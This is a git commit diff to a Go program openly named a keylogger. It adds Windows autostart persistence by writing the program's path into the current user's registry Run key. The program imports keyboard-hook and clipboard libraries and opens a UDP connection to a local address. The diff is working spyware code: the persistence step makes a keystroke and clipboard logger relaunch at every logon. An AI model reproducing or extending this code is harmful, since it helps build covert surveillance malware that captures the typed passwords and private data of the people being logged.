ed482f85187299d223f516a775297510fa2e4851
AreSZerA <18722064@bjtu.edu.cn>
2022-04-01 00:02:44 +0800

    Keylogger application autostart

--- keylogger-application/go.mod
+++ keylogger-application/go.mod
@@ -5,6 +5,7 @@ go 1.17
 require (
 	github.com/atotto/clipboard v0.1.4
 	github.com/robotn/gohook v0.31.3
+	golang.org/x/sys v0.0.0-20220330033206-e17cdc41300f
 )
 
 require github.com/vcaesar/keycode v0.10.0 // indirect
--- keylogger-application/keylogger.go
+++ keylogger-application/keylogger.go
@@ -8,16 +8,28 @@ package main
 import (
 	"fmt"
 	"github.com/atotto/clipboard"
-	hook "github.com/robotn/gohook"
+	"github.com/robotn/gohook"
+	"golang.org/x/sys/windows/registry"
 	"net"
+	"os"
 )
 
 const (
 	Protocol = "udp"
 	Address  = "127.0.0.1:8722"
+	KeyName  = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+	AppName  = "Keylogger"
 )
 
 func main() {
+	filename := os.Args[0]
+	key, _ := registry.OpenKey(registry.CURRENT_USER, KeyName, registry.ALL_ACCESS)
+	defer key.Close()
+	path, _, _ := key.GetStringValue(AppName)
+	if path != filename {
+		_ = key.SetStringValue(AppName, filename)
+	}
+
 	conn, err := net.Dial(Protocol, Address)
 	if err != nil {
 		return
